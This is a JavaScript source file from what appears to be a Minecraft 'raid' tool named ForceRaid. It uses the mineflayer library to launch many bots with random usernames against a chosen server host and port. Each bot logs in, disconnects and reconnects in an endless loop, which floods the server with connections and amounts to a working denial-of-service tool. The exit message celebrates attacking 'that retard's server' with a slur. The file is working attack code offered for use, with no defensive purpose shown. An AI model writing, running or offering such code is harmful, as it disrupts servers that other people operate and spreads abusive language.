const utils = require('./utils');
const mineflayer = require('mineflayer');
const randexp = require('randexp');
const chalk = require('chalk');

async function startRaid(cfg) {
    for(
        let i = 0;
        i <= cfg.bot_count;
        i++
    ) {
        let bot = createBot(cfg);
        await utils.sleep(cfg.throttle_delay);     
    }
}

async function stopRaid() {
    console.log('\nGood bye, hope you had fun fucking that retard\'s server! If you like ForceRaid, please consider giving us a star on github: ' + chalk.blueBright('https://github.com/m-Phoenix852/ForceRaid/'));
    process.exit(0);
}

let createBot = (cfg) => {
    let opts = {
        host: cfg.host,
        port: cfg.port,
        version: cfg.version === 'false' ? false : cfg.version === 'true' || cfg.version,
        username: genUsername()
    }

    let bot = mineflayer.createBot(
        opts     
    );

    bindEvents(bot, opts, cfg);

    return bot;
}

let bindEvents = (bot, opts, cfg) => {
    bot.on('login', () => {
        bot.end();
    })

    bot.on('end', async () => {
        await utils.sleep(cfg.throttle_delay);

        bot = mineflayer.createBot(
            opts
        )
        bindEvents(bot, opts, cfg)
    })

    bot.on('error', (err) => {
        throw err;
    })
}


let genUsername = () => {
    let regex = /^[a-zA-Z]{8}/;
    let username = new randexp(regex).gen();

    return username;
}

module.exports.startRaid = startRaid;
module.exports.stopRaid = stopRaid;